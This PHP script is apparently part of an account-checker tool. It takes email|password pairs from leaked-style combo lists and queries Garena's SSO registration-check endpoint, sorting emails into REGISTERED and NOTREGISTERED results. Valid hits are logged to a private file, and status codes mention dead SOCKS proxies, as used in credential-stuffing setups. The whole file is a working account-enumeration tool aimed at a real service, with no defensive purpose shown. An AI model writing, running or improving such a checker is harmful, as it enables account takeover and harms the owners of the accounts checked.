<?php
// 1: NOTICE, -1: UNCHECK, 2: DIE, 3: BAD/SOCKS DIE, 0: LIVE //
date_default_timezone_set("Asia/Jakarta");
error_reporting(0);
$hasil = array();
$pisah[0] = $_GET['email'];
$pisah[1] = $_GET['pass'];
$format = $_POST['mailpass'];
$pisah = explode("|", $format);
$email = $pisah[0];
$password = $pisah[1];
require 'includes/class_curl.php';


      
    $curl = new curl();
    $curl->cookies('cookies/'.md5($_SERVER['REMOTE_ADDR']).'.txt');
    $curl->ssl(0, 2);

     $url1 = "https://sso.garena.com/api/register/check?email={$email}&format=json";      
      
      $page = $curl->get($url1);

      while (!$page) {
      
      $url1 = "https://sso.garena.com/api/register/check?email={$email}&format=json";     
      $page = $curl->get($url1);
}
      if ($page) {

            if (inStr($page, '{"result": 0}')) {
                  $result['error']  = 2;
                  $result['msg']    = '<font color="red">[NOTREGISTERED] </font>- '.$email.'';
                  $result['empass'] = ''.$email.'';
                  $result['Reason'] = 'NotValid';
                  die(json_encode($result));
                  
            } else if (inStr($page, "error_email_existed")) {
            
                  $result['error']  = 0;
                  $result['msg']    = '<font color="green">[REGISTERED] </font>- '.$email.' #Private';
                  $result['empass'] = ''.$email.' ';
                  $result['Reason'] = 'Valid';
                  $a = fopen('priv/ddcode.html', 'a+');
      @fwrite($a, $result["msg"]."<br>");
      @fclose($a);
                  die(json_encode($result));

            } else {
                  die('{"error":-1,"msg":"<font size=2 color=black><font color=gold><b>UNCHECK</b></font> | '.$email.' </font>"}');
                  $curl->close(); 

            }
      } else {
            die('{"error":3,"msg":"<font size=2 color=black><font color=purple><b>SOCKS DIE</b></font> | '.$sock.'</font> | '.$email.'"}');
      }

?>
